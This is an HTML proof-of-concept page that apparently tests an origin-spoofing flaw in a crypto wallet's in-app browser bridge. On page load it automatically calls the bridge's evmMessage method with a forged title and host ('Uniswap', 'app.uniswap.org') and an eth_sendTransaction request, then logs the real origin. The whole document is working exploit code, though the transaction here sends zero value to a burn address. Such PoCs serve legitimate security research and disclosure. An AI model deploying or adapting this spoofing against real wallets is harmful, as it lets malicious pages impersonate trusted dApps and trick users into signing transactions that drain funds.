<body style="font:15px monospace;padding:18px;background:#111;color:#0f0">

<pre id=log>loading…</pre>
<button id=go style="font-size:18px;padding:10px">fire evmMessage (spoof Uniswap)</button>
<script>
function L(m){var e=document.getElementById('log');e.innerText+=("\n"+m);}
function fire(){
  try{
    var b=window._tw_;
    L("origin="+location.href);
    L("_tw_ type="+(typeof b));
    if(!b){L("NO _tw_ bridge");return;}
    var methods=[]; for(var k in b){methods.push(k);} L("methods="+methods.join(","));
    var tx={method:"eth_sendTransaction",params:[{from:"0x0000000000000000000000000000000000000000",to:"0x000000000000000000000000000000000000dEaD",value:"0x0",data:"0x"}]};
    // documented arg order: evmMessage(pageTitle, host, jsonRpc, chainId)
    L("calling _tw_.evmMessage('Uniswap','app.uniswap.org', <eth_sendTransaction>, '0x1')");
    var r = b.evmMessage ? b.evmMessage("Uniswap","app.uniswap.org",JSON.stringify(tx),"0x1") : "(no evmMessage)";
    L("evmMessage returned: "+r);
  }catch(e){L("ERR "+e);}
}
document.getElementById('go').onclick=fire;
window.onload=function(){L("page rendered. real origin = "+location.host+" (NOT app.uniswap.org)"); setTimeout(fire,800);};
</script></body></html>
